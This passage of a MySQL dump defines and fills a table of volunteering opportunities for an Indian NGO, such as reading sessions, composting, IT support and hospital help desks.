(1445, '204', '2012-11-09', '2012-11-09', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12);

-- --------------------------------------------------------

--
-- Table structure for table `volunteering_opportunities`
--

CREATE TABLE IF NOT EXISTS `volunteering_opportunities` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `domain` varchar(20) NOT NULL,
  `vertical` varchar(20) NOT NULL,
  `activity` varchar(300) NOT NULL,
  `activity_details` varchar(600) NOT NULL,
  `skills` varchar(200) NOT NULL,
  `onsite_offsite` varchar(7) NOT NULL,
  `activity_place` varchar(50) NOT NULL,
  `partner_id` int(4) NOT NULL,
  `frequency` varchar(20) NOT NULL,
  `days` varchar(50) NOT NULL,
  `hours_per_week` int(3) NOT NULL,
  `no_volunteers` int(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=35 ;

--
-- Dumping data for table `volunteering_opportunities`
--

INSERT INTO `volunteering_opportunities` (`id`, `domain`, `vertical`, `activity`, `activity_details`, `skills`, `onsite_offsite`, `activity_place`, `partner_id`, `frequency`, `days`, `hours_per_week`, `no_volunteers`) VALUES
(1, 'Project Activities', 'Education', 'Make reading fun and enjoyable experience- Volunteer to conduct reading sessions', 'Conduct English Reading Sessions for a Primary level class in a uderprivileged School (with a Mobile Library)', 'Interaction with Children at school', 'Onsite', 'Hyderabad', 0, 'Once a Week ', 'Monday to Saturday', 2, 0),
(2, 'Project Activities', '', 'Volunteer Championing -Enroll Volunteers for UC activities and projects', 'You can track UC''s volunteering oppurutnites and spread the word about how volunteers can engage with UC.', 'Coordination between volunteers and UC team', 'Offsite', '', 0, '', '', 2, 0),
(3, 'Documentation', '', 'Support Innovation through documentation - Documentation of UC projects reports, Result certificates', 'UC provides comprehensive information to all the stake holders with regards to every project it supports. Volunteers can pick the project of their choice and help capture information related to project outcomes through onsite visits and subsequent documentation of the project.', 'Documentationn and analytical skills', 'Onsite ', '', 0, '', '', 2, 0),
(4, 'Documentation', '', 'Be the Eye for YouSee- Video Documentation of our work', 'UC supports projects in the fields of Health, Education and Environment. These projects are operational in various locations in India. We need volunteers who are passionate in visual documentation of Social Development work. This contribution will be vital in communicating our work better to various stakeholders.', 'Videography, Documenting, Editing', 'Onsite ', '', 0, '', '', 2, 0),
(5, 'Analytics', '', 'Accounting for accountability -Support in book keeping and analyze the financial statements', 'UC aims at extending its support to its implementing partners beyond financial support. Volunteers can help Prepare financial statements and analysis of projects and NGO partner books of accounts. This is will ensure delivery of essential administrative services provided very cost effectively.', 'Finance and Accounts', 'Offsite', '', 0, '', '', 2, 0),
(6, 'Analytics', 'Health', 'Crunching numbers for a cause -Analytics for HealthCare projects', 'UC is currently supporting Health Care project in Hyderabad and Tamil Nadu. We need volunteers to analyze data from these projects for generating insights in these Health Care projects.', 'Spreasheet skills(Excel) and using analytical tools', 'Offsite', 'Chennai, Hyderabad', 0, '', '', 2, 0),
(7, 'Social Media', '', 'Click like button for cause, post message for change- Enhacement of Social Media platform utilisation', 'We welcome volunteers to spread word about UC on the social networking platforms and also help us find apt applicatinos which help us optimize our presence on social networking sites.', 'Facebook, Twitter etc', 'Offsite', '', 0, '', '', 2, 0),
(8, 'Project Activities', 'Environment', 'Do Not Waste, Donate Your Waste -Conduct waste donation camp at office', 'Conduct waste donation drives and volunteer to introduce Green Index practices in your office space. We look forward for volunteers who are green enthusiasts and want to work on challenges related to waste management. ', '', 'Onsite', '', 0, '', '', 1, 0),
(9, 'Project Activities', 'Environment', 'Do Not Waste, Donate Your Waste -Conduct waste donation camp at Residential Colony/Apartment', 'Conduct waste donation drives and volunteer to introduce this unique campaign in your residential space. We look forward for volunteers who are green enthusiasts and want to work on challenges related to waste management. ', '', 'Onsite', '', 0, '', '', 1, 0),
(10, 'Project Activities', 'Environment', 'Set up C-Gardens (Compost Gardens) at your Residential Community or Office', 'Help set up Compost Centers at your Residential Community or Office, where all the Food and Garden waste can be composted to generate organic manure, rather than burning or transporting the waste to Landfills.', '', 'Onsite', '', 0, '', '', 0, 0),
(11, 'Project Activities', 'Environment', 'Volunteer to monitor and train garden staff at Public Gardens and Residential areas to manage their Compost Centers ', 'UC is supporting the set up of Compost Centers in Public Gardens, Residential and Non-Residential communities to reduce organic waste being mixed with other wastes and to avoid transportation to landfills. We invite Green Enthusiasts who will visit a few of these sites atleast once a week, to monitor and train the garden staff to manage the compost centers well.', 'Basic Composting Skills, Training', 'Onsite', 'Bhopal, Hyderabad, Indore', 0, '1', '', 2, 0),
(12, 'Technology', '', 'Your valuable time to manage our valuable data -Enhancements for Database applications using MySQL/PHP', 'We have several data base applications in place and have ideated for few more. We require volunteers who can enhance existing data base applications and develop few essential ones. These appllications are used to stregthen our relationships with our dnors, volunteers, project partners, interns etc.', 'MySQL, PHP, Google Chart APIs', 'Offsite', '', 0, '', '', 4, 0),
(13, 'Technology', '', 'Find us the right resource -Advice and support in use of open/free source IT applications', 'UC aims at leveraging some of the efficient open source platforms for project management purpose. We need volunteers with adequate knowledge about these tools who can help us integrated them in our operations.', 'Open/Free Source IT applications', 'Offsite', '', 0, '', '', 2, 0),
(14, 'Technology', '', 'Helping us connect better -Enhancement to UC website to improve user interface and visualisation of UC work and data', 'Given multiple projects in multiple location, UC has very diverse audience visiting the website for varied reasons. With your help, we intend to transform our website into one of the finest platforms for diseminating pertinent information using advanced opensource tools.', 'HTML, CSS, Javascript, Google Chart APIs', 'Offsite', '', 0, '', '', 4, 0),
(15, 'Project Activities', '', 'Know the learning pulse - Conduct baseline assesments of Childrens''s learning indicators in underpreviledged schools', 'UC interfaces with several NGO''s who work in education space. Before strengthening the engagement, UC conduccts base line assessment for target population of students in the concerned schools. Most of these schools are government schools. Through volunteering for this ativity you contribute to strengthen the public education system.', 'Ability to interact with children, knowing local language will be additional benefit.', 'Onsite', 'Hyderabad, Delhi', 0, '', 'Monday to Saturday', 2, 0),
(16, 'Technology', '', 'Contribute to our work by preventing loss of work -Preventive maintenance of IT equiptment for UC and NGO partners (including PCs and Laptops)', 'Need volunteers who can help UC and partnering organizations to reduce the downtime of systems and enhance their performance by taking up periodic preventinve maintenance interventions.', '', 'Offsite', '', 0, '', '', 2, 0),
(17, 'Technology', '', 'Trouble shooting for IT (systems and applications)  related issues', 'We need volunteers who can respond on need basis for providing support for system related issues. Requirements will come from both UC team and also UC partner organizations.', '', 'Offsite', '', 0, '', '', 2, 0),
(18, 'Technology', '', 'Data back up solutions implementation', 'Designing procedures for back ups, and providing archival solutions. Volunteers would need to oversee implementation.', '', 'Offsite', '', 0, '', '', 2, 0),
(19, 'Project Activities', 'Health', 'MRD monthly Reports and Graphical Analysis at Gandhi Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(20, 'Project Activities', 'Health', 'Sanitation Supervision at a Public Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(21, 'Project Activities', 'Health', 'Plumbing Inspection at a Public Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(22, 'Project Activities', 'Health', 'Training to Data entry and Support staff on Office productivity(Software) tools ', '', '', 'Onsite', 'Hyderabad', 0, '', '', 0, 0),
(23, 'Project Activities', 'Health', 'Help Desk Team for OutPatients at Gandhi Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(24, 'Project Activities', 'Health', 'Mobile Help Team for OutPatients at Gandhi Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(25, 'Project Activities', 'Health', 'Help Desk Team for InPatients at Gandhi Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(26, 'Technology', 'Health', 'IT Network Management Support to Gandhi Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 0, 0),
(27, 'Technology', 'Health', 'IT application Development for Gandhi Hospital', '', 'MySQL, PHP', 'Offsite', 'Hyderabad', 0, '', '', 0, 0),
(28, 'Project Activities', 'Education', 'Organise Book Donation/Distribution Camps at Schools and Colleges', '', '', 'Onsite', 'Delhi, Hyderabad', 0, '', '', 0, 0),
(29, 'Project Activities', 'Health', 'Data analysis support to IPM ', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(30, 'Project Activities', 'Health', 'Data analysis support to Blood Bank at Osmania Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 2, 0),
(31, 'Project Activities', 'Health', 'Singnages Design for Gandhi Hospital', '', '', 'Onsite', 'Hyderabad', 0, '', '', 0, 0),
(32, 'Project Activities', 'Health', 'Translation of Health Educationi Videos to Telugu', '', 'English to Telugu translation', 'Offsite', '', 0, '', '', 0, 0),
(33, 'Project Activities', 'Education', 'Transportation of Clothes and Books to sorting location and for distribution at Shelter homes and Education institutions', '', '', 'Onsite', 'Delhi, Hyderabad', 0, '', '', 0, 0),
(34, 'Project Activities', '', 'Posters and Signage design for Projects', '', '', 'Offsite', '', 0, '', '', 0, 0);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
